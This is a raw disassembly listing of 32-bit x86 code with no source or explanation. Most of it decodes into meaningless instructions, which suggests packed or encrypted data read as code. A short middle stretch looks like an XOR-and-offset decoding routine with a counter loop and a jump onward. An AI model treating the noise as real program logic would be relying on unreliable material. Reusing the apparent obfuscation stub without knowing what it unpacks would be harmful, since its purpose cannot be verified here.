  40f467:	xor    eax,0x89a8f020
  40f46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f46d:	or     ch,BYTE PTR [ecx+eax*2-0x1b]
  40f471:	sbb    al,0xa6
  40f473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f474:	dec    edi
  40f475:	scas   eax,DWORD PTR es:[edi]
  40f476:	mov    bl,0x28
  40f478:	xlat   BYTE PTR ds:[ebx]
  40f479:	es xchg esp,eax
  40f47b:	jno    0x40f409
  40f47d:	data16 (bad) 
  40f47f:	jl     0x40f4e4
  40f481:	addr16 inc ebp
  40f483:	push   ds
  40f484:	xor    eax,0xb1fb101e
  40f489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f48a:	into   
  40f48b:	fcomp  QWORD PTR [ecx+ecx*1]
  40f48e:	addr16 out dx,eax
  40f490:	icebp  
  40f491:	lea    ecx,[ecx]
  40f493:	in     al,dx
  40f494:	lea    ebp,[edx+0x3a]
  40f497:	daa    
  40f498:	mov    al,0x30
  40f49a:	stos   DWORD PTR es:[edi],eax
  40f49b:	les    ebx,FWORD PTR [eax]
  40f49d:	dec    edi
  40f49e:	hlt    
  40f49f:	jmp    0x90cd:0x4e3597d0
  40f4a6:	lds    esp,FWORD PTR [ecx]
  40f4a8:	lods   eax,DWORD PTR ds:[esi]
  40f4a9:	sub    al,BYTE PTR [ebx+ebx*4+0x54b24e99]
  40f4b0:	inc    eax
  40f4b1:	retf   0xafef
  40f4b4:	mov    eax,0x465a29b5
  40f4b9:	iret   
  40f4ba:	add    eax,0xc59b61fa
  40f4bf:	stc    
  40f4c0:	fsub   DWORD PTR [ecx-0x54]
  40f4c3:	dec    edi
  40f4c4:	jge    0x40f499
  40f4c6:	mov    ds:0xb5263dac,eax
  40f4cb:	ror    BYTE PTR [edx+0x63],1
  40f4ce:	(bad)  
  40f4cf:	mov    ebx,0xfd6c8262
  40f4d4:	aaa    
  40f4d5:	or     al,0xe6
  40f4d7:	lock adc ch,BYTE PTR ds:0xf6b54d1e
  40f4de:	cmp    eax,esi
  40f4e0:	sub    eax,0x7c340ef9
  40f4e5:	in     al,0x55
  40f4e7:	mov    ds:0x920c3a5c,eax
  40f4ec:	nop
  40f4ed:	sub    al,0x20
  40f4ef:	mov    al,0xba
  40f4f1:	rcr    DWORD PTR [ebx+ecx*8],0x1e
  40f4f5:	pop    eax
  40f4f6:	and    eax,0x8890359c
  40f4fb:	ds out dx,al
  40f4fd:	jae    0x40f4e7
  40f4ff:	mov    edx,0xe0d766e3
  40f504:	popf   
  40f505:	mov    bh,0xa0
  40f507:	icebp  
  40f508:	mov    ds:0xde1cd44b,eax
  40f50d:	dec    esp
  40f50e:	dec    edi
  40f50f:	ins    DWORD PTR es:[edi],dx
  40f510:	js     0x40f52d
  40f512:	aam    0x6f
  40f514:	gs jle 0x40f4f7
  40f517:	lahf   
  40f518:	adc    ch,BYTE PTR [edi]
  40f51a:	int3   
  40f51b:	xor    esi,ebx
  40f51d:	fiadd  DWORD PTR [ecx+0x45]
  40f520:	push   esp
  40f521:	and    dh,BYTE PTR [esp+edi*1]
  40f524:	add    eax,0x9e03d4b3
  40f529:	mov    bl,0xb3
  40f52b:	mov    esi,0x25a2186a
  40f530:	mov    ebx,0xdafbc0f0
  40f535:	stc    
  40f536:	dec    esi
  40f537:	adc    al,0x5e
  40f539:	leave  
  40f53a:	std    
  40f53b:	fnstcw WORD PTR [ebx-0x7]
  40f53e:	jle    0x40f57f
  40f540:	xchg   esi,eax
  40f541:	inc    ebp
  40f542:	(bad)  
  40f543:	cwde   
  40f544:	mov    ebp,0x1ae7ea98
  40f549:	and    al,0x5e
  40f54b:	neg    dl
  40f54d:	imul   esp,ebp,0xffffffa0
  40f550:	fisub  WORD PTR [edx+0x3f268892]
  40f556:	ja     0x40f50b
  40f558:	dec    ecx
  40f559:	xchg   esp,eax
  40f55a:	jbe    0x40f55f
  40f55c:	mov    BYTE PTR [ecx+0x4868f4aa],dh
  40f562:	retf   0x94ce
  40f565:	call   0x9af894ff
  40f56a:	in     al,0x57
  40f56c:	stos   BYTE PTR es:[edi],al
  40f56d:	inc    ecx
  40f56e:	popa   
  40f56f:	xor    bh,ah
  40f571:	loopne 0x40f56e
  40f573:	push   eax
  40f574:	pop    ds
  40f575:	test   al,0xe6
  40f577:	sbb    DWORD PTR [ecx-0x7e],esi
  40f57a:	(bad)  
  40f57b:	jo     0x40f5ab
  40f57d:	add    eax,0xe2d6d4c3
  40f582:	aad    0x70
  40f584:	call   0x5963:0xaf7077f5
  40f58b:	jp     0x40f5dd
  40f58d:	bound  ebx,QWORD PTR [ecx+ebp*2-0x51]
  40f591:	(bad)  
  40f592:	pop    ebx
  40f593:	hlt    
  40f594:	clc    
  40f595:	add    esi,edi
  40f597:	xor    edx,DWORD PTR [edx+0x11]
  40f59a:	mov    ecx,0xc5ea309c
  40f59f:	pop    ebx
  40f5a0:	jg     0x40f592
  40f5a2:	str    WORD PTR ss:[eax+edx*8]
  40f5a7:	xchg   ebp,eax
  40f5a8:	mov    edx,0xbc314aa8
  40f5ad:	and    al,0xc4
  40f5af:	cld    
  40f5b0:	fdiv   QWORD PTR [eax+0x3a103623]
  40f5b6:	std    
  40f5b7:	inc    edi
  40f5b8:	imul   esi,DWORD PTR [ecx-0x46],0x39
  40f5bc:	das    
  40f5bd:	xor    bl,BYTE PTR [edx-0x7548a2ff]
  40f5c3:	lds    ebx,FWORD PTR [edi+0x60179543]
  40f5c9:	aad    0xd9
  40f5cb:	imul   ebp,DWORD PTR [esp+edx*8+0x36a452f4],0x48a2c993
  40f5d6:	imul   esi,DWORD PTR [edx],0x98ec7ad5
  40f5dc:	test   DWORD PTR [edi-0x17d7bb75],ebp
  40f5e2:	retf   0xa6d5
  40f5e5:	ffree  st(0)
  40f5e7:	or     bl,dh
  40f5e9:	pop    eax
  40f5ea:	mov    bl,0x4d
  40f5ec:	push   0x69
  40f5ee:	adc    DWORD PTR [ecx+0x73],0xd2cea6ec
  40f5f5:	jbe    0x40f584
  40f5f7:	mov    cl,0xa0
  40f5f9:	int3   
  40f5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5fb:	push   cs
  40f5fc:	pop    ebx
  40f5fd:	xor    BYTE PTR [edx+0x25],dh
  40f600:	imul   BYTE PTR [esi]
  40f602:	fcmovnu st,st(1)
  40f604:	mov    bh,0x37
  40f606:	enter  0x7492,0xd9
  40f60a:	fwait
  40f60b:	pop    ss
  40f60c:	sbb    al,BYTE PTR [edx]
  40f60e:	inc    edi
  40f60f:	push   cs
  40f610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f611:	xchg   esp,eax
  40f612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f614:	popa   
  40f615:	push   esp
  40f616:	lock lahf 
  40f618:	neg    DWORD PTR [edx]
  40f61a:	xor    dh,BYTE PTR cs:[edi-0x2c04556]
  40f621:	pop    ebp
  40f622:	push   cs
  40f623:	mov    esi,0xba9e62f1
  40f628:	call   0x104b:0x2070edc2
  40f62f:	pop    ds
  40f630:	mov    esi,0x1031bf3d
  40f635:	call   0x362:0xdbcac17d
  40f63c:	daa    
  40f63d:	sti    
  40f63e:	ret    0x7c0b
  40f641:	popa   
  40f642:	repz xor DWORD PTR [ecx-0x3b],esp
  40f646:	adc    ebp,DWORD PTR [eiz*2-0x2d4c0306]
  40f64d:	test   DWORD PTR [edi+0x18],esi
  40f650:	push   eax
  40f651:	xchg   esp,eax
  40f652:	push   es
  40f653:	je     0x40f61b
  40f655:	xor    DWORD PTR [edx],ebp
  40f657:	mov    ds:0x1dd5b7b5,al
  40f65c:	jmp    0x488a8390
  40f661:	retf   0x43a1
  40f664:	add    al,0xfd
  40f666:	test   eax,0x320dc821
  40f66b:	aaa    
  40f66c:	push   edi
  40f66d:	stos   BYTE PTR es:[edi],al
  40f66e:	aam    0x3a
  40f670:	hlt    
  40f671:	data16 jae 0x40f6db
  40f674:	outs   dx,BYTE PTR ds:[esi]
  40f675:	pop    ecx
  40f676:	rcl    DWORD PTR [edi-0x55],1
  40f679:	mov    ds:0x9fd44288,eax
  40f67e:	in     al,0x79
  40f680:	xchg   ebp,eax
  40f681:	aaa    
  40f682:	pop    edx
  40f683:	rcr    DWORD PTR ds:0xf7044bc9,0x0
  40f68a:	dec    eax
  40f68b:	lock mov esp,0x12d8d6c9
  40f691:	int    0x66
  40f693:	pop    edi
  40f694:	add    eax,0xc953c4cb
  40f699:	icebp  
  40f69a:	in     eax,dx
  40f69b:	or     DWORD PTR [edi+ebp*1],ebx
  40f69e:	sar    DWORD PTR [ecx],0x2b
  40f6a1:	lahf   
  40f6a2:	and    ah,BYTE PTR [esi-0x77]
  40f6a5:	mov    cs,WORD PTR [ecx+ebx*2+0x2a]
  40f6a9:	cwde   
  40f6aa:	cmp    al,0x17
  40f6ac:	cld    
  40f6ad:	das    
  40f6ae:	jp     0x40f66d
  40f6b0:	aad    0x26
  40f6b2:	std    
  40f6b3:	sbb    DWORD PTR [edx+eax*1-0x707689d3],eax
  40f6ba:	pop    ebp
  40f6bb:	(bad)  
  40f6bc:	dec    ebx
  40f6bd:	ds sti 
  40f6bf:	xchg   esi,eax
  40f6c0:	frstor [edx+0x65]
  40f6c3:	push   ebx
  40f6c4:	or     eax,0x501573e4
  40f6c9:	cmp    DWORD PTR [ebx+0x5fa8382a],esi
  40f6cf:	and    al,0x3e
  40f6d1:	(bad)
  40f6d4:	out    dx,eax
  40f6d5:	popa   
  40f6d6:	jmp    0x3736:0x327c2c45
  40f6dd:	adc    BYTE PTR [edi+0x24d3430],bl
  40f6e3:	in     eax,dx
  40f6e4:	fnsave [ebx]
  40f6e6:	sub    BYTE PTR [edx],0x56
  40f6e9:	repnz (bad) 
  40f6eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6ec:	int3   
  40f6ed:	sar    BYTE PTR [eax],cl
  40f6ef:	xor    edx,DWORD PTR [esi-0x6a04bdb2]
  40f6f5:	ss mov edx,0x97d8cbb4
  40f6fb:	(bad)  
  40f6fc:	xor    BYTE PTR [edx+0x5a07fa05],dl
  40f702:	xchg   ebx,eax
  40f703:	mov    ecx,DWORD PTR [edi]
  40f705:	or     BYTE PTR [edx+ebx*1+0x7d],0x57
  40f70a:	add    esi,eax
  40f70c:	fild   WORD PTR [edi]
  40f70e:	push   edx
  40f70f:	adc    al,0x92
  40f711:	mov    eax,ds:0xbf8fe3ba
  40f716:	div    BYTE PTR [esi+eax*4]
  40f719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f71a:	add    ecx,DWORD PTR [ebp+0x3962e99a]
  40f720:	into   
  40f721:	hlt    
  40f722:	int3   
  40f723:	mov    ecx,0xa1757699
  40f728:	xor    dl,BYTE PTR [esi-0x265ad5e1]
  40f72e:	shl    DWORD PTR [eax],cl
  40f730:	rcl    BYTE PTR [ebx+0x3bea454d],1
  40f736:	pop    ds
  40f737:	test   DWORD PTR [ebx],esi
  40f739:	hlt    
  40f73a:	cmp    al,al
  40f73c:	jmp    0x9549:0x532beaab
  40f743:	xchg   ebp,eax
  40f744:	repz push esp
  40f746:	mov    dl,0x4f
  40f748:	jnp    0x40f79c
  40f74a:	bound  ecx,QWORD PTR [ecx+0x65]
  40f74d:	aam    0xfb
  40f74f:	xchg   ecx,eax
  40f750:	sub    al,0xe
  40f752:	sbb    al,0x7a
  40f754:	js     0x40f6e6
  40f756:	inc    eax
  40f757:	mov    ebx,0x70d74678
  40f75c:	inc    esi
  40f75d:	mov    ah,0x1
  40f75f:	jg     0x40f703
  40f761:	mov    dh,0x90
  40f763:	scas   eax,DWORD PTR es:[edi]
  40f764:	(bad)  
  40f765:	cmp    edx,edx
  40f767:	xor    DWORD PTR [edi+0x77aeeafa],ebx
  40f76d:	dec    edx
  40f76e:	xchg   ebp,eax
  40f76f:	pop    eax
  40f770:	mov    eax,0x23aa8bf1
  40f775:	jle    0x40f71d
  40f777:	imul   eax,DWORD PTR [esi],0x726693a7
  40f77d:	xchg   esp,eax
  40f77e:	adc    DWORD PTR [esi+ebx*4],0x4
  40f782:	retf   
  40f783:	mov    edi,esi
  40f785:	adc    eax,0x8aa43de
  40f78a:	loopne 0x40f797
  40f78c:	popf   
  40f78d:	leave  
  40f78e:	xchg   BYTE PTR [ebx-0x58b10e9a],bl
  40f794:	push   ds
  40f795:	in     eax,0x4a
  40f797:	in     al,0xce
  40f799:	xor    bl,dh
  40f79b:	push   ebp
  40f79c:	and    cl,BYTE PTR [ecx]
  40f79e:	xchg   BYTE PTR [edi+0x21517464],cl
  40f7a4:	adc    al,0x96
  40f7a6:	iret   
  40f7a7:	ds scas al,BYTE PTR es:[edi]
  40f7a9:	inc    bh
  40f7ab:	and    eax,0xd0447353
  40f7b0:	scas   al,BYTE PTR es:[edi]
  40f7b1:	sub    edi,DWORD PTR [ecx-0xb]
  40f7b4:	imul   ebp,DWORD PTR [esi+0x344b709c],0xa6c50d3b
  40f7be:	jle    0x40f7d8
  40f7c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c1:	sbb    dl,bl
  40f7c3:	ja     0x40f815
  40f7c5:	pop    ecx
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x42fa38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x6b8df680
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	daa    
  40f871:	push   ss
  40f872:	ret    
  40f873:	cmp    al,0x5c
  40f875:	jb     0x40f814
  40f877:	les    esi,FWORD PTR [edi+0x633062e]
  40f87d:	out    0x59,eax
  40f87f:	xchg   ebp,eax
  40f880:	shl    esi,0xd8
  40f883:	fwait
  40f884:	daa    
  40f885:	aad    0x8a
  40f887:	pop    ecx
  40f888:	mov    al,0x34
  40f88a:	jno    0x40f847
  40f88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f88d:	sbb    bh,BYTE PTR [edi+0x6a96f2d2]
  40f893:	jge    0x40f882
  40f895:	mov    edx,0xe62f24a6
  40f89a:	jmp    0xad78a095
  40f89f:	pop    ebx
  40f8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8a1:	adc    edx,ebp
  40f8a3:	int    0x5e
  40f8a5:	xor    dl,ah
  40f8a7:	aas    
  40f8a8:	xchg   esi,eax
  40f8a9:	or     BYTE PTR [esi],0xeb
  40f8ac:	fidiv  DWORD PTR [eax+0x33878a1c]
  40f8b2:	scas   al,BYTE PTR es:[edi]
  40f8b3:	clc    
  40f8b4:	mov    ebx,0x920c97d3
  40f8b9:	(bad)  
  40f8ba:	into   
  40f8bb:	(bad)  
  40f8bc:	adc    esi,DWORD PTR [ebp+0x16]
  40f8bf:	lods   al,BYTE PTR ds:[esi]
  40f8c0:	aaa    
  40f8c1:	(bad)  
  40f8c2:	aad    0xe8
  40f8c4:	bound  ebp,QWORD PTR [edx]
  40f8c6:	mov    dl,0x28
  40f8c8:	aas    
  40f8c9:	sub    eax,DWORD PTR [edx+ebx*8]
  40f8cc:	and    BYTE PTR [eax],dh
  40f8ce:	fwait
  40f8cf:	mov    eax,ebx
  40f8d1:	popf   
  40f8d2:	or     dl,BYTE PTR [esi+0x25]
  40f8d5:	jge    0x40f917
  40f8d7:	outs   dx,DWORD PTR ds:[esi]
  40f8d8:	push   ecx
  40f8d9:	leave  
  40f8da:	adc    ch,BYTE PTR [edx+0xa617aec]
  40f8e0:	mov    edx,0xec1bae7d
  40f8e5:	xor    al,BYTE PTR [eax]
  40f8e7:	stos   DWORD PTR es:[edi],eax
  40f8e8:	inc    edx
  40f8e9:	fidivr DWORD PTR [edx]
  40f8eb:	mov    eax,ds:0xe15ca4fa
  40f8f0:	ins    DWORD PTR es:[edi],dx
  40f8f1:	push   esi
  40f8f2:	xchg   ebx,eax
  40f8f3:	or     BYTE PTR ds:0x14261ded,0x94
  40f8fa:	and    eax,0x74141c0a
  40f8ff:	hlt    
  40f900:	push   ebx
  40f901:	push   ebx
  40f902:	sbb    DWORD PTR [edi-0x72],0xffffffa6
  40f906:	adc    ch,dh
  40f908:	loop   0x40f89b
  40f90a:	leave  
  40f90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f90c:	xchg   ecx,eax
  40f90d:	mov    ds:0x6348422f,al
  40f912:	out    dx,eax
  40f913:	sbb    eax,0xb393c9a4
  40f918:	adc    eax,0x3bd26f6b
  40f91d:	mov    ah,0x16
  40f91f:	pop    ss
  40f920:	jne    0x40f951
  40f922:	arpl   WORD PTR [ebp+0x17c84bc6],cx
  40f928:	dec    BYTE PTR [edi+0x3be1490f]
  40f92e:	fidiv  DWORD PTR [ecx+0x3374e881]
  40f934:	mov    bl,0x9f
  40f936:	sahf   
  40f937:	xchg   ecx,eax
  40f938:	in     al,dx
  40f939:	pop    ebp
  40f93a:	inc    edx
  40f93b:	push   cs
  40f93c:	int3   
  40f93d:	sbb    bh,dh
  40f93f:	push   edx
  40f940:	mov    WORD PTR [esi],?
  40f942:	xor    al,0xb8
  40f944:	push   ebx
  40f945:	cs in  al,dx
  40f947:	sub    al,0x22
  40f949:	into   
  40f94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94b:	je     0x40f8f0
  40f94d:	fbld   TBYTE PTR [ecx]
  40f94f:	cmp    ah,0x16
  40f952:	adc    ebx,DWORD PTR [edi]
  40f954:	xchg   edx,eax
  40f955:	pop    ss
  40f956:	sub    BYTE PTR [edi],bh
  40f958:	add    BYTE PTR [edi+0x79],0xbe
  40f95c:	dec    ebp
  40f95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f95e:	sbb    edx,DWORD PTR [edi]
  40f960:	dec    ebp
  40f961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f962:	mov    ds:0xed5c03b6,al
  40f967:	aam    0xd5
  40f969:	cmp    eax,0x84ed6e64
  40f96e:	lods   eax,DWORD PTR ds:[esi]
  40f96f:	cmp    eax,DWORD PTR fs:[esi]
  40f972:	push   ecx
  40f973:	(bad)  
  40f974:	cmp    DWORD PTR [esi+0x6],eax
  40f977:	mov    ch,0x2a
  40f979:	fldenv [edx-0x9be06ec]
  40f97f:	leave  
  40f980:	xor    BYTE PTR [esi-0x4a491a9a],0x69
  40f987:	mul    BYTE PTR [eax]
  40f989:	repnz call 0x86fe:0xe19d6757
  40f991:	arpl   WORD PTR [eax+0x5f32af76],si
  40f997:	cli    
  40f998:	adc    ch,bl
  40f99a:	add    ch,BYTE PTR [esi+0x4dddf00d]
  40f9a0:	pop    eax
  40f9a1:	xor    ebx,DWORD PTR [esi-0x16417114]
  40f9a7:	dec    edx
  40f9a8:	add    edx,eax
  40f9aa:	push   0xffffffbc
  40f9ac:	inc    ecx
  40f9ad:	sbb    eax,0x47c3a1a
  40f9b2:	pop    ecx
  40f9b3:	dec    esi
  40f9b4:	and    ebx,DWORD PTR [ebp+0x5b]
  40f9b7:	and    eax,0x7e912d43
  40f9bc:	ret    0xf42d
  40f9bf:	pop    esp
  40f9c0:	fs pop ds
  40f9c2:	mov    gs,WORD PTR [eax-0x69]
  40f9c5:	lahf   
  40f9c6:	mov    ebx,0x394c7213
  40f9cb:	push   ecx
  40f9cc:	lods   eax,DWORD PTR ds:[esi]
  40f9cd:	mov    bh,0x96
  40f9cf:	imul   ebx,DWORD PTR [ebx+0x74],0x30
  40f9d3:	inc    ebp
  40f9d4:	(bad)  
  40f9d6:	stos   DWORD PTR es:[edi],eax
  40f9d7:	bound  esi,QWORD PTR [ecx]
  40f9d9:	dec    ebp
  40f9da:	sbb    bh,BYTE PTR [ebp-0x60]
  40f9dd:	out    dx,al
  40f9de:	push   eax
  40f9df:	jmp    0x27cf5c9f
  40f9e4:	repnz fiadd DWORD PTR [esi-0x587187c5]
  40f9eb:	repnz lds esi,FWORD PTR [ebx-0x14bd4957]
  40f9f2:	leave  
  40f9f3:	(bad)
  40f9f6:	or     eax,DWORD PTR [ecx-0x5e]
  40f9f9:	mov    ecx,0x22cf1fc8
  40f9fe:	loop   0x40fa02
  40fa00:	jmp    0x40f9c9
  40fa02:	or     ecx,DWORD PTR [ebp-0x15]
  40fa05:	loop   0x40f996
  40fa07:	jbe    0x40fa06
  40fa09:	add    BYTE PTR [edi+eiz*8],bl
  40fa0c:	mov    cl,0x21
  40fa0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa0f:	push   eax
  40fa10:	test   edx,0xa15037cb
  40fa16:	pop    esp
  40fa17:	(bad)  
  40fa18:	adc    esp,DWORD PTR [ecx-0x3146cfc5]
  40fa1e:	pop    es
  40fa1f:	push   ss
  40fa20:	mov    ebx,0xa04cfee5
  40fa25:	mov    ch,0x39
  40fa27:	test   eax,0x47b92567
  40fa2c:	pop    ds
  40fa2d:	or     BYTE PTR [esi],0x54
  40fa30:	sahf   
  40fa31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa32:	mov    ebx,0xfa40d354
  40fa37:	mov    ebp,0x26b08c30
  40fa3c:	ret    
  40fa3d:	std    
  40fa3e:	stos   BYTE PTR es:[edi],al
  40fa3f:	imul   ebx,ecx,0xae3e0c3d
  40fa45:	call   0x1732:0x7c8ce027
  40fa4c:	dec    ebp
  40fa4d:	inc    esi
  40fa4e:	mov    ds:0x3ca3e787,eax
  40fa53:	lods   eax,DWORD PTR ds:[esi]
  40fa54:	fcmovnbe st,st(4)
  40fa56:	xor    DWORD PTR [ebx],0x69
  40fa59:	not    DWORD PTR [edx-0x20]
  40fa5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa5d:	(bad)  
  40fa5e:	in     eax,0xa8
  40fa60:	inc    eax
  40fa61:	xor    dl,bl
  40fa63:	ins    DWORD PTR es:[edi],dx
  40fa64:	ds xchg ecx,eax
  40fa66:	(bad)  
  40fa68:	push   ss
  40fa69:	out    dx,eax
  40fa6a:	or     ebp,DWORD PTR [eax-0x50]
  40fa6d:	mul    DWORD PTR [esi]
  40fa6f:	mov    ecx,0x26427cef
  40fa74:	stc    
  40fa75:	mov    dh,0x59
  40fa77:	sub    al,0xb1
  40fa79:	pextrw ecx,(bad),0xc5
  40fa7b:	or     dh,cl
  40fa7d:	adc    al,0xbe
  40fa7f:	js     0x40fac0
  40fa81:	ret    0xe63b
  40fa84:	js     0x40fae9
  40fa86:	outs   dx,BYTE PTR ds:[esi]
  40fa87:	pop    edi
  40fa88:	retf   
  40fa89:	add    eax,0x95a46db1
  40fa8e:	out    dx,eax
  40fa8f:	xchg   ebx,eax
  40fa90:	mov    edx,0xc42c1aac
  40fa95:	inc    ecx
  40fa96:	sub    eax,DWORD PTR [eax]
  40fa98:	add    BYTE PTR [esi+0x52279522],0xf7
  40fa9f:	mov    cl,0x81
  40faa1:	mov    ds:0x1a754fb9,eax
  40faa6:	xlat   BYTE PTR ds:[ebx]
  40faa7:	xor    eax,0xf188c2ec
  40faac:	sub    ebp,0x6463fdd3
  40fab2:	les    esp,FWORD PTR ds:0x4025b57c
  40fab8:	adc    edx,ebp
  40faba:	sahf   
  40fabb:	pop    ebp
  40fabc:	jnp    0x40fa94
  40fabe:	idiv   DWORD PTR [esi]
  40fac0:	cmp    ah,bl
  40fac2:	mov    bl,al
  40fac4:	adc    DWORD PTR [edx+0x4d],ecx
  40fac7:	sbb    ecx,edx
  40fac9:	imul   ecx,DWORD PTR [ebp-0x4a],0x5ce2e4bc
  40fad0:	(bad)  
  40fad2:	mov    ds:0x2494990d,eax
  40fad7:	in     eax,dx
  40fad8:	and    DWORD PTR [ecx],edi
  40fada:	sub    BYTE PTR [esi-0x66],cl
  40fadd:	jge    0x40fa83
  40fadf:	xor    al,0x69
  40fae1:	test   eax,0xe91d36a3
  40fae6:	jbe    0x40fb31
  40fae8:	mov    dl,BYTE PTR [edi+0xa]
  40faeb:	sbb    DWORD PTR [ebx],0xe3c456f3
  40faf1:	push   0xffffffca
  40faf3:	test   edx,edi
  40faf5:	adc    DWORD PTR [ecx*1+0x34f5edc4],ebx
  40fafc:	jmp    0xba3a:0x67b3b9bf
  40fb03:	cld    
  40fb04:	mov    ss,ebp
  40fb06:	xor    eax,0xcebbb93c
  40fb0b:	leave  
  40fb0c:	fadd   DWORD PTR [edi+ecx*8]
  40fb0f:	imul   edi
  40fb11:	mov    BYTE PTR [ecx-0x2d],cl
  40fb14:	cmp    ecx,DWORD PTR [ebx-0x6062699e]
  40fb1a:	ins    BYTE PTR es:[edi],dx
  40fb1b:	sbb    BYTE PTR [ebp+0x16],bl
  40fb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1f:	inc    eax
  40fb20:	push   cs
  40fb21:	sbb    ebp,ebp
  40fb23:	xchg   edx,eax
  40fb24:	(bad)  
  40fb25:	shl    BYTE PTR [edi-0x78],1
  40fb28:	ins    BYTE PTR es:[edi],dx
  40fb29:	fld    QWORD PTR [ecx]
  40fb2b:	js     0x40faf9
  40fb2d:	xlat   BYTE PTR ds:[ebx]
  40fb2e:	ins    BYTE PTR es:[edi],dx
  40fb2f:	mov    esi,0x7f502aff
  40fb34:	sar    bh,cl
  40fb36:	sti    
  40fb37:	data16 add dl,BYTE PTR [edx-0x38463b40]
  40fb3e:	rcl    DWORD PTR [eax+ecx*8],1
  40fb41:	dec    edi
  40fb42:	mov    ds:0xbd93def2,al
  40fb47:	adc    BYTE PTR [esi],ch
  40fb49:	outs   dx,BYTE PTR ds:[esi]
  40fb4a:	jmp    0x2443d09
  40fb4f:	dec    edx
  40fb50:	daa    
  40fb51:	out    0xd1,al
  40fb53:	cmc    
  40fb54:	ret    0xb6aa
  40fb57:	shl    DWORD PTR [ebx-0x8731905],cl
  40fb5d:	les    edi,FWORD PTR [edi+0x2e]
  40fb60:	dec    eax
  40fb61:	into   
  40fb62:	sub    eax,0x7b19edb2
  40fb67:	push   cs
  40fb68:	aad    0xd5
  40fb6a:	cmp    eax,0xe4383a8d
  40fb6f:	and    al,0x82
  40fb71:	push   ebx
  40fb72:	mov    DWORD PTR [edi],ebx
  40fb74:	lds    eax,FWORD PTR [eax+0x9]
  40fb77:	into   
  40fb78:	out    0x6b,al
  40fb7a:	ds jp  0x40fb46
  40fb7d:	sahf   
  40fb7e:	push   ebx
  40fb7f:	not    DWORD PTR [ebx]
  40fb81:	mov    bh,0xf4
  40fb83:	push   ebx
  40fb84:	data16 mov WORD PTR [edx+0x26eb2559],ss
  40fb8b:	mov    ds,WORD PTR [edi]
  40fb8d:	sti    
  40fb8e:	out    0x66,al
  40fb90:	sbb    bl,al
  40fb92:	pop    ds
  40fb93:	aam    0xb0
  40fb95:	fcmovbe st,st(4)
  40fb97:	xchg   esp,eax
  40fb98:	fist   DWORD PTR [ebp+0x5d]
  40fb9b:	clc    
  40fb9c:	loop   0x40fb4b
  40fb9e:	cmp    BYTE PTR [ebp-0x16],ch
  40fba1:	dec    eax
  40fba2:	shl    BYTE PTR [ebx],cl
  40fba4:	enter  0x610d,0xd5
  40fba8:	add    al,0xcb
  40fbaa:	lahf   
  40fbab:	add    edx,ebp
  40fbad:	jecxz  0x40fba7
  40fbaf:	lods   al,BYTE PTR ds:[esi]
  40fbb0:	push   esp
  40fbb1:	das    
  40fbb2:	mov    al,ds:0x940edab2
  40fbb7:	lds    ebp,FWORD PTR [eax-0x7831287f]
  40fbbd:	(bad)  
  40fbbe:	loope  0x40fc38
  40fbc0:	(bad)  
  40fbc1:	outs   dx,DWORD PTR ds:[esi]
  40fbc2:	mov    eax,ds:0x7b18885e
  40fbc7:	std    
  40fbc8:	test   al,0x57
  40fbca:	leave  
  40fbcb:	pop    es
  40fbcc:	pop    eax
  40fbcd:	outs   dx,BYTE PTR ds:[esi]
  40fbce:	sbb    DWORD PTR [ebx-0x6612f76e],esp
  40fbd4:	js     0x40fbb3
  40fbd6:	imul   ebx,DWORD PTR [edi],0xffffffb1
  40fbd9:	fisttp WORD PTR ds:0x95b06b41
  40fbdf:	dec    esi
